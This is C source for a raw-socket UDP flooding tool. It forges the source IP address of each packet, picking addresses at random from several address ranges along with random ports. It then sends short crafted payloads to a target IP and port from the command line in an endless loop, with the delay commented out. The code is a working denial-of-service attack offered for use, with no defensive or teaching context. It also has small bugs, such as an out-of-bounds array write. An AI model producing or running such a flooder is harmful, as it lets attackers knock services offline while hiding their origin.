    #include <time.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <netinet/ip.h>
    #include <netinet/tcp.h>
    #include <netinet/udp.h>
    #include <arpa/inet.h>
    #include <string.h>
    #include <stdio.h>
    #include <stdlib.h>
     
    #define LEN 512

    typedef unsigned short u16;
    typedef unsigned long u32;


    //2nd
    unsigned short csum (unsigned short *buf, int nwords);
    uint16_t udp_checksum(const struct iphdr  *ip,
            const struct udphdr *udp,
            const uint16_t *buf);



     
    int main(int argc, char * argv[])
    {
     srand(time(NULL));
        if(argc < 3)
        {
            printf("- Usage %s <IP> <PUERTO>\n", argv[0]);
            exit(1);
        }
       
        while(1)
        {
       
       int iprang[6];
            iprang[0] = 181;
            iprang[1] = 186;
            iprang[2] = 201;
            iprang[3] = 190;
            iprang[4] = 86;
            iprang[5] = 84;
            iprang[6] = 92;
      char ip_d[20];
        sprintf(ip_d, "%d.%d.%d.%d", iprang[rand() % 6 ],rand() % 148, rand() % 254, rand () % 254);
        int s_port = 30024 + (rand() % 48422);
    	 int PSOURCE = s_port;
        int PDEST = atoi(argv[2]);
        char * SOURCE = ip_d;
        char * DEST = argv[1];
        int s;
        struct sockaddr_in daddr, saddr, answerip;
        char packet[LEN];
        /* point the iphdr to the beginning of the packet */
        struct iphdr *ip = (struct iphdr *)packet;  
        struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));
     
        if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
            perror("error:");
            exit(EXIT_FAILURE);
        }
     
        daddr.sin_family = AF_INET;
        saddr.sin_family = AF_INET;
        daddr.sin_port = htons(PDEST);
        saddr.sin_port = htons(PSOURCE);
        inet_pton(AF_INET, DEST, (struct in_addr *)&daddr.sin_addr.s_addr);
        inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);
     
        memset(daddr.sin_zero, 0, sizeof(daddr.sin_zero));
        memset(saddr.sin_zero, 0, sizeof(saddr.sin_zero));
        memset(udp, 0, sizeof(struct udphdr));
        memset(ip, 0, sizeof(struct iphdr));
     
        ip->ihl = 5; //header length
        ip->version = 4;
        ip->tos = 0;
        ip->id = 2000 + (rand() % 40311);
        ip->frag_off = 0x00;  
        ip->ttl = 1 + (rand() % 112);          /* default value */
        ip->protocol = 17;  //IPPROTO_RAW;  /* protocol at L4 */
        ip->check = 0;          /* not needed in iphdr */
        ip->saddr = saddr.sin_addr.s_addr;
        ip->daddr = daddr.sin_addr.s_addr;
     
        udp->source = htons(PSOURCE);
        udp->dest = htons (PDEST);
     
        int sizedata = 4;
        char incoming[sizedata];
        char * packet_pos  = ((void *) udp) + sizeof(struct udphdr);
        memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
	packet_pos[0] = 0x08;
packet_pos[1] = 0x1e;
packet_pos[2] = 0x78;
packet_pos[3] = 0xda;
    	
//for(int i = 0; i != sizeof(incoming); i++) packet_pos[i] = (char)(rand() & 0xFFFF);
       memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
        int sizeudpdata = sizeof(struct udphdr) + sizedata;
        ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
        udp->len = htons(sizeudpdata);
        int optval = 1;
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int))
                < 0)
            perror ("IP HDRINCL");
            int sizepacket = sizeof(struct iphdr) + sizeudpdata;
        udp->check = 0;
        udp->check = udp_checksum(
                ip,
                udp,
               (const uint16_t *)udp);
    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;   
//====/
sizedata = 4;
 sizeudpdata = sizeof(struct udphdr) + sizedata;
     ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
        udp->len = htons(sizeudpdata);
 //      for(int i = 0; i != sizeof(incoming); i++) packet_pos[i] = (char)(rand() & 0xFFFF);
     memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
       packet_pos[0] = (char)(rand()%200);
       packet_pos[0] = 0x1e;
       packet_pos[0] = (char)(rand()%203);
       packet_pos[0] = (char)(rand()%203);


           memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
        udp->check = 0;
        udp->check = udp_checksum(
                ip,
                udp,
               (const uint16_t *)udp);

    sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;

 sizeudpdata = sizeof(struct udphdr) + 6;
     ip->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    /* 16 byte value */
        udp->len = htons(sizeudpdata);
 //      for(int i = 0; i != sizeof(incoming); i++) packet_pos[i] = (char)(rand() & 0xFFFF);
     memset(((void *) udp) + sizeof(struct udphdr), 'A', 6);
       packet_pos[0] = 0x88;
       packet_pos[1] = 0x27;
       packet_pos[2] = 0x85;
       packet_pos[3] = 0xc7;
       packet_pos[4] = 0xd7;
       packet_pos[5] = 0x99;
     memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, 6);



        udp->check = 0;
        udp->check = udp_checksum(
                ip,
                udp,
               (const uint16_t *)udp);
  sendto(s, (char *)packet, sizepacket, 0,(struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)) ;

                close(s);
      //usleep(1); // CHANGEME
        
}
        exit(EXIT_SUCCESS);
    }
     
    //http://www.linuxquestions.org/questions/linux-networking-3/udp-checksum-algorithm-845618/
    //modified by Gabriel Serme
    struct pseudo_hdr {
        u_int32_t source;
        u_int32_t dest;
        u_int8_t zero; //reserved, check http://www.rhyshaden.com/udp.htm
        u_int8_t protocol;
        u_int16_t udp_length;
    };
     
    uint16_t udp_checksum(const struct iphdr  *ip,
            const struct udphdr *udp,
            const uint16_t *buf)
    {
        //take in account padding if necessary
        int calculated_length = ntohs(udp->len)%2 == 0 ? ntohs(udp->len) : ntohs(udp->len) + 1;
     
        struct pseudo_hdr ps_hdr = {0};
        bzero (&ps_hdr, sizeof(struct pseudo_hdr));
        uint8_t data[sizeof(struct pseudo_hdr) + calculated_length];
        bzero (data, sizeof(struct pseudo_hdr) + calculated_length );
     
        ps_hdr.source = ip->saddr;
        ps_hdr.dest = ip->daddr;
        ps_hdr.protocol = IPPROTO_UDP; //17
        ps_hdr.udp_length = udp->len;
     
        memcpy(data, &ps_hdr, sizeof(struct pseudo_hdr));
        memcpy(data + sizeof(struct pseudo_hdr), buf, ntohs(udp->len) ); //the remaining bytes are set to 0
     
        return csum((uint16_t *)data, sizeof(data)/2);
    }
     
    /* Not my code */
    unsigned short csum (unsigned short *buf, int nwords)
    {
        unsigned long sum;
     
        for (sum = 0; nwords > 0; nwords--)
            sum += *buf++;
     
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        return ~sum;
    }
